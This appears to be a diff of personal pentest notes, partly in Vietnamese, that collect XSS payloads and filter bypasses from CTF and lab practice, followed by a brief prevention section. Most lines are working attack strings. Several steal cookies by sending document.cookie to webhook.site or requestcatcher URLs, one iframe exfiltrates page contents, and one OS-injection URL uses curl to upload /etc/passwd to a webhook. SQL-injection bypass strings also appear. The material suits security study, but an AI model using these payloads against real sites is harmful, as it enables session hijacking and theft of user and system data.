@@ -1,7 +1,9 @@
 .html .svg .swf  FILE exec js
 https://tsublogs.wordpress.com/2017/04/26/pentest-qa-cung-tsu-3-xss-upload-style/
 
-document.cookie k the nam tren url
+document.cookie URL begins with https:// and won't be sent over an insecure connection.
+https://www.4rth4s.xyz/2020/05/pentest-lgvn-xss-detecting-and.html    #but this is ok, why
+<script>alert("1337")</script><script>document.location='https://4rth4s.requestcatcher.com/' +document.cookie</script>
 http-only flag is on, you can’t steal cookie, but you can get it from phpinfo!
 
 <script> new Image().src="https://webhook.site/43135504-ab95-4e9c-9283-8b5e05482863/"+document.cookie;</script>
@@ -20,7 +22,7 @@ level 3:
 <script>
 <img src=1 onerror="fetch('https://webhook.site/b43acf3e-ccdd-4eb1-9bc8-ad049fdba717/'+document.cookie)"></img>
 <img+src%3d1+onerror%3d"fetch('https://webhook.site/3f2f695d-152c-44ff-9368-54b7f0c4ed70/'%2bdocument.cookie)"></img>
-<img+src=1+on......="alert(1)"></img>
+<img+src=1+on......="alert(1)"></img>`
 <script nonce="404">alert(1);</script>
 script<script>alert(1)</script>
 
@@ -34,12 +36,35 @@ level 5: redirect  --> javascript:......
 script<script>window.location="https://serializededitor.com/"</script>
 
 level 6: https://ejs.co/
-<%-
-<%=
+<%-   #Outputs the unescaped value into the template
+<%=   #Outputs the value into the template (HTML escaped)
 
 "><svg onload=alert(1)>
+https://nhattruong.blog/2022/04/01/write-up-rootme-xss-challenge/
+<a href='test' onmousemove='document.location="<webhook>?cmd=".concat(document.cookie)
+{{constructor.constructor("alert(1)")()}}   #bypass ' filter
+eval
 -------------------------------innerHTML
 <iframe id=1 src="https://koinbase-ff27148a4.cyberjutsu-lab.tech/api/user.php?action=detail_info" onload=window.location="https://webhook.site/126c94e9-2c39-4f20-8732-b6955b5cd1cb/".concat(document.getElementById(1).contentDocument.body.innerHTML)></iframe>
+---------------------------------------------------bypass
+https://drx.home.blog/2019/07/29/xss-cross-site-scripting-part-2-payload-and-bypass/
+<img/onerror='alert(1)'src=a>    #bypass space
+<imgsrc=1onerror='document.location="https://webhook.site/65a8b027-b90a-4aab-9e17-1ef2a69d67a2?cmd="+document.cookie'/>
+#Filter kí tự ', ", 
+6. Sanitize kí tự quote, doublequote trong string
+7. Limit input length
+<svg><use href=”data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x” />
+
+Strtoupper Bypass
+https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets/sql-injection-xss-playground
+sanitize_text_field  bypass
+https://viblo.asia/p/fantastic-bug-in-wordpress-plugin-and-where-to-find-them-AZoJjgryLY7
+http://localhost:8085/wordpress/wp-admin/admin.php?page=nggallery-manage-gallery&input="+autofocus+onfocus=alert(1)+x=1
+------------------------------bypass XSS Auditor
+https://drx.home.blog/2019/07/31/xss-cross-site-scripting-part-3-xss-auditor/
+X-XSS-Protection: 0
+bypass Abusing the block mode – XS Search
+XXS -> brute force
 -------------------------------------------------------unstrust data is in a values;
 <script>var a=''-alert(1)-'';</script>
 someString"-alert(1)-"someString
@@ -48,6 +73,7 @@ someString"-alert(1)-"someString
 
 <noscript><p title='</noscript><img src="a" onerror="alert(origin)">'>
 <style><p title='</style><img src="a" onerror="alert(1)">'>
+<img src="a" onerror="prompt(1)">'>
 
 XSS payload bypass: http://localhost:8403/search.php?content=%3Ca+href%3D%22javascript%3Aconsole.log%28origin%29%22%22%3Eclick-va-view-o-tab-console%3C%2Fa%3E
 - Real search: <a href="javascript:console.log(origin)">click-va-view-o-tab-console</a>
@@ -58,12 +84,23 @@ SQL payload bypass: http://localhost:8403/search.php?content=%22%25%27+union+sel
 OS payload bypass: http://localhost:8403/search.php?content=%60cu%5c%0arl%20--data-binary%20%22@/et%5c%0ac/pas%5c%0aswd%22%20HTTPS://webhook.site/7264d41d-6fd0-4064-bcee-3f486400a2a3%60
 ----------------------------------prototype -> XSS
 https://nhattruong.blog/2021/12/21/write-up-uit-ctf-wannagame/
+-----------------------------------------------------bypass filter
+https://hackmd.io/@taidh/HyPQyGvpj#California-state-police
+Dùng /**/ để thay thế khoảng trắng.
+<img src='
+'onerror='/*
+*/alert(/*
+*/1)'>
+<img src=onerror'fetch("flag").then(r=>r.text()).then(t=>window.open("http:ip/"+t))>
 ---------------------------------------------------prevent
 xử dụng cơ chế nonce
 set httponly
+DOMPurify.santitize
 https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
+https://drx.home.blog/2019/07/31/xss-cross-site-scripting-part-3-xss-auditor/
 ---------------------csrf prevent
 set samesite=strict --prevent csrf
 or samesite=lax -- to get cookie from another web which you created
 csrf_token
 https://duthanhduoc.com/blog/p2-giai-ngo-authentication-session
+https://viblo.asia/p/lap-trinh-an-toan-hoc-duoc-gi-tu-cach-hacker-vuot-qua-xac-thuc-csrf-token-aAY4qv6kJPw
